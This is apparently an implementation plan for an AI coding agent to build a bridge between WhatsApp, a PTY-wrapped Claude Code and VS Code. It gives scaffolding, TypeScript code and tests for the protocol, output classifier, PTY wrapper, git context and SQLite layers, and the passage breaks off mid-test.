# Claude Code Live Bridge — Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a bidirectional streaming bridge connecting WhatsApp, Claude Code (via PTY), and VS Code into a unified remote development session.

**Architecture:** Monorepo with npm workspaces. Local Agent daemon wraps Claude Code in a PTY, classifies output, and routes messages. Bridge Server handles WhatsApp via Baileys. VS Code Extension provides full-fidelity sidebar with diffs and handoff. All components communicate over WebSocket with a shared JSON protocol.

**Tech Stack:** Node.js 20+, TypeScript, node-pty, @whiskeysockets/baileys, ws, better-sqlite3, js-yaml, VS Code Extension API, PM2

---

## Monorepo Structure

```
claude-code-live-bridge/
├── package.json              # root workspace config
├── tsconfig.base.json        # shared TS config
├── config.example.yaml       # example configuration
├── packages/
│   ├── shared/               # types, protocol, utilities
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── types.ts          # Session, Message, AuditLog, ContextSnapshot
│   │       ├── protocol.ts       # WebSocket envelope, message types
│   │       ├── constants.ts      # defaults, enums
│   │       └── index.ts
│   ├── agent/                # Local Agent daemon
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── index.ts          # entry point, daemon startup
│   │       ├── pty-wrapper.ts    # spawn claude-code, capture/inject
│   │       ├── classifier.ts     # activity classifier pipeline
│   │       ├── session-manager.ts# session registry + SQLite
│   │       ├── message-router.ts # route classified output to destinations
│   │       ├── git-context.ts    # git context snapshot collector
│   │       ├── ws-server.ts      # WebSocket server for bridge + vscode
│   │       └── db.ts             # better-sqlite3 setup
│   ├── bridge/               # Bridge Server (WhatsApp)
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── index.ts          # entry point
│   │       ├── baileys.ts        # Baileys session management
│   │       ├── auth.ts           # allowlist, PIN, rate limiting
│   │       ├── formatter.ts      # WhatsApp message formatting
│   │       ├── parser.ts         # inbound message parsing
│   │       └── safety.ts         # blocklist, audit logging
│   ├── extension/            # VS Code Extension
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── extension.ts      # activate/deactivate
│   │       ├── sidebar.ts        # webview provider
│   │       ├── ws-client.ts      # WebSocket to agent
│   │       ├── git-watcher.ts    # file save, branch, tab events
│   │       ├── diff-actions.ts   # accept/reject/comment
│   │       └── webview/
│   │           ├── index.html
│   │           └── main.js
│   └── cli/                  # Setup wizard
│       ├── package.json
│       └── src/
│           └── index.ts
```

---

## Phase 1: PTY Agent + Local Proof of Concept

**Deliverable:** A running daemon that wraps Claude Code, classifies output, collects git context, and can be tested via a CLI harness.

---

### Task 1: Monorepo Scaffold

**Files:**
- Create: `package.json`
- Create: `tsconfig.base.json`
- Create: `packages/shared/package.json`
- Create: `packages/shared/tsconfig.json`
- Create: `packages/agent/package.json`
- Create: `packages/agent/tsconfig.json`

**Step 1: Initialize git repo and root package.json**

```bash
git init
```

Create `package.json`:
```json
{
  "name": "claude-code-live-bridge",
  "private": true,
  "workspaces": ["packages/*"],
  "scripts": {
    "build": "npm run build --workspaces",
    "test": "npm run test --workspaces --if-present"
  }
}
```

**Step 2: Create shared tsconfig**

Create `tsconfig.base.json`:
```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "Node16",
    "moduleResolution": "Node16",
    "declaration": true,
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "outDir": "dist",
    "rootDir": "src",
    "sourceMap": true
  }
}
```

**Step 3: Create packages/shared**

`packages/shared/package.json`:
```json
{
  "name": "@live-bridge/shared",
  "version": "0.1.0",
  "main": "dist/index.js",
  "types": "dist/index.d.ts",
  "scripts": {
    "build": "tsc",
    "test": "vitest run"
  },
  "devDependencies": {
    "typescript": "^5.4.0",
    "vitest": "^3.0.0"
  }
}
```

`packages/shared/tsconfig.json`:
```json
{
  "extends": "../../tsconfig.base.json",
  "compilerOptions": { "outDir": "dist", "rootDir": "src" },
  "include": ["src"]
}
```

**Step 4: Create packages/agent**

`packages/agent/package.json`:
```json
{
  "name": "@live-bridge/agent",
  "version": "0.1.0",
  "main": "dist/index.js",
  "scripts": {
    "build": "tsc",
    "start": "node dist/index.js",
    "dev": "tsx watch src/index.ts",
    "test": "vitest run"
  },
  "dependencies": {
    "@live-bridge/shared": "*",
    "node-pty": "^1.0.0",
    "better-sqlite3": "^11.0.0",
    "ws": "^8.18.0",
    "js-yaml": "^4.1.0"
  },
  "devDependencies": {
    "typescript": "^5.4.0",
    "tsx": "^4.0.0",
    "vitest": "^3.0.0",
    "@types/better-sqlite3": "^7.6.0",
    "@types/ws": "^8.5.0",
    "@types/js-yaml": "^4.0.0"
  }
}
```

**Step 5: Install dependencies and verify**

```bash
npm install
npx tsc --version
```

**Step 6: Commit**

```bash
git add -A && git commit -m "chore: scaffold monorepo with shared + agent packages"
```

---

### Task 2: Shared Types & Protocol

**Files:**
- Create: `packages/shared/src/types.ts`
- Create: `packages/shared/src/protocol.ts`
- Create: `packages/shared/src/constants.ts`
- Create: `packages/shared/src/index.ts`
- Test: `packages/shared/src/__tests__/protocol.test.ts`

**Step 1: Write the failing test**

`packages/shared/src/__tests__/protocol.test.ts`:
```typescript
import { describe, it, expect } from "vitest";
import { createEnvelope, MessageType, Source } from "../index";

describe("protocol", () => {
  it("creates a valid envelope with auto-filled seq and ts", () => {
    const env = createEnvelope({
      type: MessageType.Command,
      source: Source.WhatsApp,
      sessionId: "test-session",
      payload: { text: "fix the bug" },
    });

    expect(env.type).toBe("command");
    expect(env.source).toBe("whatsapp");
    expect(env.sessionId).toBe("test-session");
    expect(env.seq).toBeGreaterThan(0);
    expect(env.ts).toMatch(/^\d{4}-\d{2}-\d{2}T/);
    expect(env.payload.text).toBe("fix the bug");
  });

  it("increments seq across calls", () => {
    const a = createEnvelope({ type: MessageType.Command, source: Source.VSCode, sessionId: "s", payload: {} });
    const b = createEnvelope({ type: MessageType.Command, source: Source.VSCode, sessionId: "s", payload: {} });
    expect(b.seq).toBe(a.seq + 1);
  });
});
```

**Step 2: Run test to verify it fails**

```bash
cd packages/shared && npx vitest run
```
Expected: FAIL — modules don't exist yet.

**Step 3: Implement shared types**

`packages/shared/src/constants.ts`:
```typescript
export enum MessageType {
  Command = "command",
  Response = "response",
  Stream = "stream",
  Decision = "decision",
  Status = "status",
  Error = "error",
  Control = "control",
  Context = "context",
}

export enum Source {
  WhatsApp = "whatsapp",
  VSCode = "vscode",
  Agent = "agent",
  ClaudeCode = "claude-code",
}

export enum SessionStatus {
  Active = "active",
  Paused = "paused",
  Detached = "detached",
  Terminated = "terminated",
}

export enum Classification {
  Command = "command",
  Status = "status",
  Output = "output",
  Decision = "decision",
  Error = "error",
  Control = "control",
}

export const DEFAULTS = {
  WS_PORT_BRIDGE: 9377,
  WS_PORT_VSCODE: 9378,
  STATUS_BATCH_INTERVAL_S: 10,
  WAIT_TIMEOUT_MS: 500,
  MAX_WA_MESSAGE_LENGTH: 1500,
  RATE_LIMIT_PER_HOUR: 30,
  RATE_LIMIT_BURST: 5,
  RECENT_COMMIT_COUNT: 3,
  MAX_DIFF_FILES: 10,
  AUDIT_RETENTION_DAYS: 30,
} as const;
```

`packages/shared/src/types.ts`:
```typescript
import { SessionStatus, Classification, Source } from "./constants";

export interface Session {
  id: string;
  name: string;
  aliases: string[];
  projectPath: string;
  status: SessionStatus;
  isWhatsAppActive: boolean;
  createdAt: string;
  lastActivityAt: string;
  claudeCodePid: number | null;
  vscodeConnected: boolean;
  pendingDecision: boolean;
  metadata: Record<string, unknown>;
}

export interface Message {
  id?: number;
  sessionId: string;
  seq: number;
  timestamp: string;
  source: Source;
  classification: Classification;
  rawContent: string;
  formattedContent: string;
  whatsappFormatted: string | null;
  delivered: { whatsapp: boolean; vscode: boolean };
}

export interface AuditEntry {
  id?: number;
  timestamp: string;
  event: string;
  source: string;
  detail: string;
  blocked: boolean;
  blockReason: string | null;
}

export interface ContextSnapshot {
  sessionId: string;
  updatedAt: string;
  branch: string;
  trackingStatus: string | null;
  uncommittedSummary: {
    filesChanged: number;
    insertions: number;
    deletions: number;
    files: { name: string; status: string; lines: number }[];
  };
  recentCommits: { hash: string; message: string; author: string; date: string }[];
  openFiles: string[];
  activeFile: string | null;
  activeLine: number | null;
  repoName: string;
  repoRoot: string;
}
```

`packages/shared/src/protocol.ts`:
```typescript
import { MessageType, Source } from "./constants";

export interface Envelope {
  type: MessageType;
  seq: number;
  ts: string;
  source: Source;
  sessionId: string;
  payload: Record<string, unknown>;
}

let seqCounter = 0;

export function createEnvelope(opts: {
  type: MessageType;
  source: Source;
  sessionId: string;
  payload: Record<string, unknown>;
}): Envelope {
  return {
    type: opts.type,
    seq: ++seqCounter,
    ts: new Date().toISOString(),
    source: opts.source,
    sessionId: opts.sessionId,
    payload: opts.payload,
  };
}

export function resetSeq(): void {
  seqCounter = 0;
}
```

`packages/shared/src/index.ts`:
```typescript
export * from "./types";
export * from "./protocol";
export * from "./constants";
```

**Step 4: Run test to verify it passes**

```bash
cd packages/shared && npx vitest run
```
Expected: PASS

**Step 5: Commit**

```bash
git add -A && git commit -m "feat(shared): add types, protocol envelope, and constants"
```

---

### Task 3: Activity Classifier

**Files:**
- Create: `packages/agent/src/classifier.ts`
- Test: `packages/agent/src/__tests__/classifier.test.ts`

**Step 1: Write failing tests**

`packages/agent/src/__tests__/classifier.test.ts`:
```typescript
import { describe, it, expect } from "vitest";
import { classify, Classification } from "../classifier";

describe("Activity Classifier", () => {
  describe("STATUS detection", () => {
    it("classifies 'Reading src/api/auth.ts...' as STATUS", () => {
      expect(classify("Reading src/api/auth.ts...")).toBe(Classification.Status);
    });
    it("classifies 'Analyzing authentication flow...' as STATUS", () => {
      expect(classify("Analyzing authentication flow...")).toBe(Classification.Status);
    });
    it("classifies 'Searching for files...' as STATUS", () => {
      expect(classify("Searching for files...")).toBe(Classification.Status);
    });
  });

  describe("DECISION detection", () => {
    it("classifies 'Should I proceed with all three fixes? (y/n)' as DECISION", () => {
      expect(classify("Should I proceed with all three fixes? (y/n)")).toBe(Classification.Decision);
    });
    it("classifies 'Run this command?' as DECISION", () => {
      expect(classify("Run this command?")).toBe(Classification.Decision);
    });
    it("classifies 'Would you like me to apply these changes?' as DECISION", () => {
      expect(classify("Would you like me to apply these changes?")).toBe(Classification.Decision);
    });
  });

  describe("ERROR detection", () => {
    it("classifies 'Error: ENOENT' as ERROR", () => {
      expect(classify("Error: ENOENT: no such file")).toBe(Classification.Error);
    });
    it("classifies 'TypeError: x is not a function' as ERROR", () => {
      expect(classify("TypeError: x is not a function")).toBe(Classification.Error);
    });
    it("classifies stack traces as ERROR", () => {
      expect(classify("    at Object.<anonymous> (/src/index.ts:5:1)")).toBe(Classification.Error);
    });
  });

  describe("OUTPUT detection", () => {
    it("classifies multi-line explanation as OUTPUT", () => {
      expect(classify("Found 3 issues:\n1. No token expiry\n2. Missing rotation")).toBe(Classification.Output);
    });
    it("classifies plain text result as OUTPUT", () => {
      expect(classify("The authentication module uses JWT tokens stored in httpOnly cookies.")).toBe(Classification.Output);
    });
  });
});
```

**Step 2: Run test to verify it fails**

```bash
cd packages/agent && npx vitest run
```

**Step 3: Implement classifier**

`packages/agent/src/classifier.ts`:
```typescript
export { Classification } from "@live-bridge/shared";
import { Classification } from "@live-bridge/shared";

const STATUS_PATTERNS = [
  /^(Reading|Searching|Analyzing|Loading|Scanning|Compiling|Indexing)\b/i,
  /^\s*(\||\\|\/|-)\s*$/,
  /^(\d+)\/(\d+) (files|tests|modules)/,
  /^\.\.\.$/,
];

const DECISION_PATTERNS = [
  /\?\s*$/,
  /\b(proceed|confirm|apply|approve|accept|continue)\b.*\?/i,
  /\b(y\/n|yes\/no)\b/i,
  /\b(should I|shall I|do you want|would you like)\b/i,
  /^(Run|Execute|Create|Delete|Modify)\b.*\?/i,
];

const ERROR_PATTERNS = [
  /^(Error|ERROR|FATAL|Exception|Traceback|panic):/,
  /^\s+at\s+/,
  /^(npm ERR!|SyntaxError|TypeError|ReferenceError)/,
  /exit code [1-9]/i,
];

export function classify(text: string): Classification {
  const trimmed = text.trim();
  const firstLine = trimmed.split("\n")[0];

  // ERROR — check all lines, first line priority
  for (const p of ERROR_PATTERNS) {
    if (p.test(firstLine) || p.test(trimmed)) return Classification.Error;
  }

  // DECISION — check full text
  for (const p of DECISION_PATTERNS) {
    if (p.test(trimmed)) return Classification.Decision;
  }

  // STATUS — first line only
  for (const p of STATUS_PATTERNS) {
    if (p.test(firstLine)) return Classification.Status;
  }

  // Default: OUTPUT
  return Classification.Output;
}
```

**Step 4: Run tests**

```bash
cd packages/agent && npx vitest run
```
Expected: PASS

**Step 5: Commit**

```bash
git add -A && git commit -m "feat(agent): activity classifier with regex pattern matching"
```

---

### Task 4: Line Buffer (streaming PTY chunks → complete lines)

**Files:**
- Create: `packages/agent/src/line-buffer.ts`
- Test: `packages/agent/src/__tests__/line-buffer.test.ts`

**Step 1: Write failing test**

`packages/agent/src/__tests__/line-buffer.test.ts`:
```typescript
import { describe, it, expect } from "vitest";
import { LineBuffer } from "../line-buffer";

describe("LineBuffer", () => {
  it("assembles complete lines from partial chunks", () => {
    const lines: string[] = [];
    const buf = new LineBuffer((line) => lines.push(line));

    buf.push("Reading src/");
    expect(lines).toHaveLength(0);

    buf.push("auth.ts...\n");
    expect(lines).toEqual(["Reading src/auth.ts..."]);
  });

  it("handles multiple lines in one chunk", () => {
    const lines: string[] = [];
    const buf = new LineBuffer((line) => lines.push(line));
    buf.push("line1\nline2\nline3\n");
    expect(lines).toEqual(["line1", "line2", "line3"]);
  });

  it("strips ANSI escape codes", () => {
    const lines: string[] = [];
    const buf = new LineBuffer((line) => lines.push(line));
    buf.push("\x1b[32mReading file...\x1b[0m\n");
    expect(lines).toEqual(["Reading file..."]);
  });

  it("flushes partial line on flush()", () => {
    const lines: string[] = [];
    const buf = new LineBuffer((line) => lines.push(line));
    buf.push("partial content");
    expect(lines).toHaveLength(0);
    buf.flush();
    expect(lines).toEqual(["partial content"]);
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

`packages/agent/src/line-buffer.ts`:
```typescript
const ANSI_RE = /\x1b\[[0-9;]*[a-zA-Z]|\x1b\].*?\x07/g;

export class LineBuffer {
  private buffer = "";

  constructor(private onLine: (line: string) => void) {}

  push(chunk: string): void {
    this.buffer += chunk;
    const parts = this.buffer.split("\n");
    // Last element is the incomplete remainder
    this.buffer = parts.pop()!;
    for (const part of parts) {
      this.onLine(part.replace(ANSI_RE, "").trimEnd());
    }
  }

  flush(): void {
    if (this.buffer.length > 0) {
      this.onLine(this.buffer.replace(ANSI_RE, "").trimEnd());
      this.buffer = "";
    }
  }
}
```

**Step 4: Run tests — expect PASS**

**Step 5: Commit**

```bash
git add -A && git commit -m "feat(agent): line buffer with ANSI stripping for PTY chunks"
```

---

### Task 5: PTY Wrapper

**Files:**
- Create: `packages/agent/src/pty-wrapper.ts`
- Test: `packages/agent/src/__tests__/pty-wrapper.test.ts`

**Step 1: Write failing test**

`packages/agent/src/__tests__/pty-wrapper.test.ts`:
```typescript
import { describe, it, expect, vi } from "vitest";
import { PtyWrapper } from "../pty-wrapper";

describe("PtyWrapper", () => {
  it("spawns a process and emits classified lines", async () => {
    const lines: { text: string; classification: string }[] = [];

    // Use 'echo' as a stand-in for claude-code to test the wrapper
    const pty = new PtyWrapper({
      command: process.platform === "win32" ? "cmd.exe" : "echo",
      args: process.platform === "win32" ? ["/c", "echo", "Reading file..."] : ["Reading file..."],
      cwd: process.cwd(),
    });

    pty.on("classified", (line) => lines.push(line));

    await new Promise<void>((resolve) => {
      pty.on("exit", () => resolve());
    });

    expect(lines.length).toBeGreaterThan(0);
    expect(lines.some((l) => l.text.includes("Reading file"))).toBe(true);
  });

  it("injects stdin text", async () => {
    const pty = new PtyWrapper({
      command: process.platform === "win32" ? "cmd.exe" : "cat",
      args: process.platform === "win32" ? ["/c", "findstr", ".*"] : [],
      cwd: process.cwd(),
    });

    const lines: string[] = [];
    pty.on("classified", (l) => lines.push(l.text));

    pty.write("hello\n");

    await new Promise((r) => setTimeout(r, 500));
    pty.kill();

    expect(lines.some((l) => l.includes("hello"))).toBe(true);
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

`packages/agent/src/pty-wrapper.ts`:
```typescript
import { EventEmitter } from "events";
import * as pty from "node-pty";
import { LineBuffer } from "./line-buffer";
import { classify } from "./classifier";
import { Classification } from "@live-bridge/shared";

export interface PtyOptions {
  command: string;
  args?: string[];
  cwd: string;
  env?: Record<string, string>;
}

export interface ClassifiedLine {
  text: string;
  classification: Classification;
  timestamp: string;
  raw: string;
}

export class PtyWrapper extends EventEmitter {
  private process: pty.IPty;
  private lineBuffer: LineBuffer;
  private rawBuffer: string[] = [];

  constructor(opts: PtyOptions) {
    super();

    this.lineBuffer = new LineBuffer((line) => {
      if (line.trim().length === 0) return;
      const classified: ClassifiedLine = {
        text: line,
        classification: classify(line),
        timestamp: new Date().toISOString(),
        raw: this.rawBuffer.join(""),
      };
      this.rawBuffer = [];
      this.emit("classified", classified);
    });

    this.process = pty.spawn(opts.command, opts.args ?? [], {
      name: "xterm-256color",
      cwd: opts.cwd,
      env: { ...process.env, ...opts.env } as Record<string, string>,
      cols: 120,
      rows: 40,
    });

    this.process.onData((data: string) => {
      this.rawBuffer.push(data);
      this.lineBuffer.push(data);
      this.emit("raw", data);
    });

    this.process.onExit(({ exitCode }) => {
      this.lineBuffer.flush();
      this.emit("exit", exitCode);
    });
  }

  write(text: string): void {
    this.process.write(text);
  }

  kill(): void {
    this.process.kill();
  }

  get pid(): number {
    return this.process.pid;
  }

  resize(cols: number, rows: number): void {
    this.process.resize(cols, rows);
  }
}
```

**Step 4: Run tests — expect PASS**

**Step 5: Commit**

```bash
git add -A && git commit -m "feat(agent): PTY wrapper with classified line output"
```

---

### Task 6: Git Context Collector

**Files:**
- Create: `packages/agent/src/git-context.ts`
- Test: `packages/agent/src/__tests__/git-context.test.ts`

**Step 1: Write failing test**

`packages/agent/src/__tests__/git-context.test.ts`:
```typescript
import { describe, it, expect } from "vitest";
import { collectGitContext, formatContextHeader } from "../git-context";
import { ContextSnapshot } from "@live-bridge/shared";

describe("Git Context", () => {
  it("collects context from a real git repo", async () => {
    // Use this project's own repo for testing
    const ctx = await collectGitContext(process.cwd());
    expect(ctx.branch).toBeTruthy();
    expect(ctx.repoRoot).toBeTruthy();
  });

  it("formats a compact context header", () => {
    const snapshot: ContextSnapshot = {
      sessionId: "test",
      updatedAt: new Date().toISOString(),
      branch: "main",
      trackingStatus: "ahead 2",
      uncommittedSummary: {
        filesChanged: 3,
        insertions: 45,
        deletions: 12,
        files: [{ name: "auth.ts", status: "M", lines: 20 }],
      },
      recentCommits: [{ hash: "abc", message: "fix auth", author: "craig", date: "2026-03-10" }],
      openFiles: ["auth.ts", "routes.ts"],
      activeFile: "auth.ts",
      activeLine: 42,
      repoName: "chartcopilot",
      repoRoot: "/projects/chartcopilot",
    };

    const header = formatContextHeader(snapshot);
    expect(header).toContain("main");
    expect(header).toContain("3 files changed");
    expect(header).toContain("+45 -12");
  });

  it("returns sensible defaults for non-git directory", async () => {
    const ctx = await collectGitContext("/tmp");
    expect(ctx.branch).toBe("");
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

`packages/agent/src/git-context.ts`:
```typescript
import { execFile } from "child_process";
import { promisify } from "util";
import { ContextSnapshot } from "@live-bridge/shared";

const exec = promisify(execFile);

async function git(cwd: string, ...args: string[]): Promise<string> {
  try {
    const { stdout } = await exec("git", args, { cwd, timeout: 5000 });
    return stdout.trim();
  } catch {
    return "";
  }
}

export async function collectGitContext(cwd: string): Promise<ContextSnapshot> {
  const branch = await git(cwd, "rev-parse", "--abbrev-ref", "HEAD");
  if (!branch) {
    return emptySnapshot("", cwd);
  }

  const repoRoot = await git(cwd, "rev-parse", "--show-toplevel");
  const repoName = repoRoot.split("/").pop() ?? repoRoot.split("\\").pop() ?? "";

  // Tracking status
  const tracking = await git(cwd, "rev-list", "--left-right", "--count", `${branch}...@{upstream}`);
  let trackingStatus: string | null = null;
  if (tracking) {
    const [ahead, behind] = tracking.split(/\s+/).map(Number);
    const parts: string[] = [];
    if (ahead) parts.push(`ahead ${ahead}`);
    if (behind) parts.push(`behind ${behind}`);
    trackingStatus = parts.join(", ") || null;
  }

  // Diff stats
  const diffStat = await git(cwd, "diff", "--stat", "--numstat");
  const lines = diffStat.split("\n").filter(Boolean);
  let insertions = 0;
  let deletions = 0;
  const files: { name: string; status: string; lines: number }[] = [];
  for (const line of lines) {
    const match = line.match(/^(\d+|-)\t(\d+|-)\t(.+)$/);
    if (match) {
      const ins = match[1] === "-" ? 0 : parseInt(match[1], 10);
      const del = match[2] === "-" ? 0 : parseInt(match[2], 10);
      insertions += ins;
      deletions += del;
      files.push({ name: match[3], status: "M", lines: ins + del });
    }
  }

  // Recent commits
  const logRaw = await git(cwd, "log", "--oneline", "-5", "--format=%h|%s|%an|%ai");
  const recentCommits = logRaw
    .split("\n")
    .filter(Boolean)
    .map((line) => {
      const [hash, message, author, date] = line.split("|");
      return { hash, message, author, date };
    });

  return {
    sessionId: "",
    updatedAt: new Date().toISOString(),
    branch,
    trackingStatus,
    uncommittedSummary: { filesChanged: files.length, insertions, deletions, files },
    recentCommits,
    openFiles: [],
    activeFile: null,
    activeLine: null,
    repoName,
    repoRoot,
  };
}

export function formatContextHeader(ctx: ContextSnapshot): string {
  const parts: string[] = [];
  parts.push(ctx.branch);
  if (ctx.trackingStatus) parts.push(ctx.trackingStatus);
  if (ctx.uncommittedSummary.filesChanged > 0) {
    parts.push(
      `${ctx.uncommittedSummary.filesChanged} files changed (+${ctx.uncommittedSummary.insertions} -${ctx.uncommittedSummary.deletions})`
    );
  }
  if (ctx.openFiles.length > 0) {
    parts.push(`open: ${ctx.openFiles.slice(0, 5).join(", ")}`);
  }
  return `[ctx: ${parts.join(" | ")}]`;
}

function emptySnapshot(sessionId: string, cwd: string): ContextSnapshot {
  return {
    sessionId,
    updatedAt: new Date().toISOString(),
    branch: "",
    trackingStatus: null,
    uncommittedSummary: { filesChanged: 0, insertions: 0, deletions: 0, files: [] },
    recentCommits: [],
    openFiles: [],
    activeFile: null,
    activeLine: null,
    repoName: "",
    repoRoot: cwd,
  };
}
```

**Step 4: Run tests — expect PASS**

**Step 5: Commit**

```bash
git add -A && git commit -m "feat(agent): git context collector with CLI fallback"
```

---

### Task 7: Database Layer (SQLite)

**Files:**
- Create: `packages/agent/src/db.ts`
- Test: `packages/agent/src/__tests__/db.test.ts`

**Step 1: Write failing test**

`packages/agent/src/__tests__/db.test.ts`:
```typescript
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { Database } from "../db";
import { SessionStatus, Source, Classification } from "@live-bridge/shared";

describe("Database", () => {
  let db: Database;

  beforeEach(() => {
    db = new Database(":memory:");
  });

  afterEach(() => {
    db.close();
  });

  it("creates and retrieves a session", () => {
    db.createSession({ id: "s1", name: "chartcopilot", projectPath: "/projects/ccp" });
    const session = db.getSession("s1");
    expect(session).toBeTruthy();
    expect(session!.name).toBe("chartcopilot");
    expect(session!.status).toBe(SessionStatus.Active);
  });

  it("lists all active sessions", () => {
    db.createSession({ id: "s1", name: "ccp", projectPath: "/p1" });
    db.createSession({ id: "s2", name: "sched", projectPath: "/p2" });
    const sessions = db.listSessions();
    expect(sessions).toHaveLength(2);
  });

  it("inserts and retrieves messages", () => {
    db.createSession({ id: "s1", name: "test", projectPath: "/p" });
    db.insertMessage({
      sessionId: "s1",
      source: Source.WhatsApp,
      classification: Classification.Command,
      rawContent: "fix the bug",
      formattedContent: "fix the bug",
    });
    const msgs = db.getMessages("s1", 10);
    expect(msgs).toHaveLength(1);
    expect(msgs[0].rawContent).toBe("fix the bug");
  });

  it("logs audit entries", () => {
    db.logAudit({ event: "command_received", source: "+1234567890", detail: "fix the bug" });
    const logs = db.getAuditLogs(10);
    expect(logs).toHaveLength(1);
    expect(logs[0].event).toBe("command_received");
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

`packages/agent/src/db.ts`:
```typescript
import BetterSqlite3 from "better-sqlite3";
import { Session, SessionStatus, Source, Classification } from "@live-bridge/shared";

export class Database {
  private db: BetterSqlite3.Database;

  constructor(path: string) {
    this.db = new BetterSqlite3(path);
    this.db.pragma("journal_mode = WAL");
    this.migrate();
  }

  private migrate(): void {
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        aliases TEXT DEFAULT '[]',
        projectPath TEXT NOT NULL,
        status TEXT DEFAULT '${SessionStatus.Active}',
        isWhatsAppActive INTEGER DEFAULT 0,
        createdAt TEXT DEFAULT (datetime('now')),
        lastActivityAt TEXT DEFAULT (datetime('now')),
        claudeCodePid INTEGER,
        vscodeConnected INTEGER DEFAULT 0,
        pendingDecision INTEGER DEFAULT 0,
        metadata TEXT DEFAULT '{}'
      );

      CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sessionId TEXT NOT NULL REFERENCES sessions(id),
        seq INTEGER NOT NULL,
        timestamp TEXT DEFAULT (datetime('now')),
        source TEXT NOT NULL,
        classification TEXT NOT NULL,
        rawContent TEXT NOT NULL,
        formattedContent TEXT NOT NULL,
        whatsappFormatted TEXT,
        delivered TEXT DEFAULT '{"whatsapp":false,"vscode":false}'
      );

      CREATE TABLE IF NOT EXISTS audit_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT DEFAULT (datetime('now')),
        event TEXT NOT NULL,
        source TEXT NOT NULL,
        detail TEXT NOT NULL,
        blocked INTEGER DEFAULT 0,
        blockReason TEXT
      );
    `);
  }

  createSession(opts: { id: string; name: string; projectPath: string }): void {
    this.db.prepare(
      "INSERT INTO sessions (id, name, projectPath) VALUES (?, ?, ?)"
    ).run(opts.id, opts.name, opts.projectPath);
  }

  getSession(id: string): Session | null {
    const row = this.db.prepare("SELECT * FROM sessions WHERE id = ?").get(id) as any;
    return row ? this.rowToSession(row) : null;
  }

  getSessionByName(name: string): Session | null {
    const row = this.db.prepare(
      "SELECT * FROM sessions WHERE name = ? OR aliases LIKE ?"
    ).get(name, `%"${name}"%`) as any;
    return row ? this.rowToSession(row) : null;
  }

  listSessions(): Session[] {
    const rows = this.db.prepare(
      "SELECT * FROM sessions WHERE status != 'terminated' ORDER BY lastActivityAt DESC"
    ).all() as any[];
    return rows.map((r) => this.rowToSession(r));
  }

  updateSession(id: string, fields: Partial<Record<string, unknown>>): void {
    const sets = Object.keys(fields).map((k) => `${k} = @${k}`).join(", ");
    this.db.prepare(`UPDATE sessions SET ${sets} WHERE id = @id`).run({ ...fields, id });
  }

  private seqCounters = new Map<string, number>();

  insertMessage(opts: {
    sessionId: string;
    source: Source;
    classification: Classification;
    rawContent: string;
    formattedContent: string;
    whatsappFormatted?: string;
  }): number {
    const seq = (this.seqCounters.get(opts.sessionId) ?? 0) + 1;
    this.seqCounters.set(opts.sessionId, seq);
    const result = this.db.prepare(
      `INSERT INTO messages (sessionId, seq, source, classification, rawContent, formattedContent, whatsappFormatted)
       VALUES (?, ?, ?, ?, ?, ?, ?)`
    ).run(opts.sessionId, seq, opts.source, opts.classification, opts.rawContent, opts.formattedContent, opts.whatsappFormatted ?? null);
    return result.lastInsertRowid as number;
  }

  getMessages(sessionId: string, limit: number): any[] {
    return this.db.prepare(
      "SELECT * FROM messages WHERE sessionId = ? ORDER BY seq DESC LIMIT ?"
    ).all(sessionId, limit);
  }

  logAudit(opts: { event: string; source: string; detail: string; blocked?: boolean; blockReason?: string }): void {
    this.db.prepare(
      `INSERT INTO audit_log (event, source, detail, blocked, blockReason) VALUES (?, ?, ?, ?, ?)`
    ).run(opts.event, opts.source, opts.detail, opts.blocked ? 1 : 0, opts.blockReason ?? null);
  }

  getAuditLogs(limit: number): any[] {
    return this.db.prepare("SELECT * FROM audit_log ORDER BY id DESC LIMIT ?").all(limit);
  }

  close(): void {
    this.db.close();
  }

  private rowToSession(row: any): Session {
    return {
      ...row,
      aliases: JSON.parse(row.aliases),
      isWhatsAppActive: !!row.isWhatsAppActive,
      vscodeConnected: !!row.vscodeConnected,
      pendingDecision: !!row.pendingDecision,
      metadata: JSON.parse(row.metadata),
    };
  }
}
```

**Step 4: Run tests — expect PASS**

**Step 5: Commit**

```bash
git add -A && git commit -m "feat(agent): SQLite database layer for sessions, messages, audit"
```

---

### Task 8: Session Manager

**Files:**
- Create: `packages/agent/src/session-manager.ts`
- Test: `packages/agent/src/__tests__/session-manager.test.ts`

**Step 1: Write failing test**

`packages/agent/src/__tests__/session-manager.test.ts`:
```typescript
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { SessionManager } from "../session-manager";

describe("SessionManager", () => {
  let mgr: SessionManager;

  beforeEach(() => {
    mgr = new SessionManager(":memory:");
  });

  afterEach(() => {
    mgr.close();
  });

  it("registers a new session and sets it as active", () => {
    mgr.register("chartcopilot", "/projects/ccp");
    const sessions = mgr.listSessions();
    expect(sessions).toHaveLength(1);
    expect(sessions[0].name).toBe("chartcopilot");
    expect(sessions[0].isWhatsAppActive).toBe(true);
  });

  it("resolves session by alias", () => {
    mgr.register("chartcopilot", "/projects/ccp", ["ccp", "chart"]);
    const session = mgr.resolve("ccp");
    expect(session).toBeTruthy();
    expect(session!.name).toBe("chartcopilot");
  });

  it("switches active session", () => {
    mgr.register("ccp", "/p1");
    mgr.register("sched", "/p2");
    mgr.switchActive("sched");
    const active = mgr.getActive();
    expect(active!.name).toBe("sched");
  });

  it("fuzzy matches session names", () => {
